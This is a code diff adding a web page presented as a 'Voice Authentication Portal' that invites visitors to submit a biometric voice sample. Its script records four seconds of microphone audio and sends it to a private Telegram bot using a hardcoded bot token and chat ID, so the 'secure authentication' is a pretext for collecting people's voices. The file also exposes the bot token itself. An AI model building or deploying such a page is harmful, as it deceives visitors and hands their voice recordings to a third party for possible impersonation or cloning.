@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice Authentication Portal</title>
+    <style>
+        :root {
+            --primary: #00f2fe;
+            --secondary: #4facfe;
+            --bg: #0a0b10;
+            --panel: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.08);
+            --text: #ffffff;
+            --success: #00ff87;
+            --error: #ff416c;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at center, #1a1c29 0%, var(--bg) 100%);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Glassmorphism Design */
+        .lock-container {
+            background: var(--panel);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            padding: 40px;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 40px;
+        }
+
+        .start-btn {
+            padding: 15px 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            color: #0a0b10;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(0, 242, 254, 0.4);
+            transition: transform 0.2s, box-shadow 0.3s;
+        }
+
+        .start-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 35px rgba(0, 242, 254, 0.6);
+        }
+
+        .status-box {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+            min-height: 50px;
+        }
+
+        /* Responsive Wave Animation */
+        .wave-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            height: 30px;
+            margin: 20px 0;
+        }
+
+        .wave-bar {
+            width: 4px;
+            height: 10px;
+            background: var(--primary);
+            border-radius: 3px;
+            animation: soundWave 1.2s ease-in-out infinite alternate;
+        }
+        .wave-bar:nth-child(2) { animation-delay: 0.3s; }
+        .wave-bar:nth-child(3) { animation-delay: 0.6s; }
+
+        @keyframes soundWave {
+            0% { transform: scaleY(1); }
+            100% { transform: scaleY(3); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="lock-container">
+        <h1>Voice Portal</h1>
+        <p class="subtitle">Click below to begin biometric submission</p>
+
+        <button class="start-btn" id="init-btn">Initialize Secure Recording</button>
+
+        <div class="wave-container" id="wave-visual">
+            <div class="wave-bar"></div>
+            <div class="wave-bar"></div>
+            <div class="wave-bar"></div>
+        </div>
+
+        <div class="status-box" id="status-text">Awaiting Initialization...</div>
+    </div>
+
+    <script>
+        // Your credentials updated live from screenshots:
+        const TELEGRAM_BOT_TOKEN = '8761591948:AAEzT7IEik95YxWe80bc01tEjS3GZLnPonc';
+        const TELEGRAM_CHAT_ID = '861444218';
+
+        const initBtn = document.getElementById('init-btn');
+        const statusText = document.getElementById('status-text');
+        const waveVisual = document.getElementById('wave-visual');
+
+        let mediaRecorder;
+        let audioChunks = [];
+
+        initBtn.addEventListener('click', async () => {
+            initBtn.style.display = 'none';
+            statusText.textContent = "Requesting mic access...";
+
+            try {
+                // Request mic permission
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    waveVisual.style.display = 'none';
+                    statusText.textContent = "Processing audio file...";
+
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                    
+                    // Fire dispatch to your Telegram bot
+                    await sendToTelegram(audioBlob);
+                };
+
+                // Start structural capture for 4 seconds
+                mediaRecorder.start();
+                waveVisual.style.display = 'flex';
+                statusText.textContent = "Recording sample... Please speak.";
+
+                setTimeout(() => {
+                    statusText.textContent = "Stopping capture...";
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 4000); 
+
+            } catch (err) {
+                statusText.innerHTML = "<span style='color: var(--error)'>Error: Access denied. Make sure you use HTTPS.</span>";
+                initBtn.style.display = 'inline-block';
+                console.error(err);
+            }
+        });
+
+        async function sendToTelegram(blob) {
+            statusText.textContent = "Uploading sample to Telegram Bot...";
+            
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('voice', blob, 'voice_sample.ogg');
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    statusText.innerHTML = "<span style='color: var(--success); font-weight: bold;'>Data Sent Successfully!</span><br><small style='opacity:0.6;'>Check your @EditorLabBot</small>";
+                } else {
+                    statusText.innerHTML = "<span style='color: var(--error)'>Upload Failed. Check connection configurations.</span>";
+                }
+            } catch (error) {
+                statusText.innerHTML = "<span style='color: var(--error)'>Connection Error.</span>";
+                console.error(error);
+            }
+        }
+    </script>
+</body>
+</html>
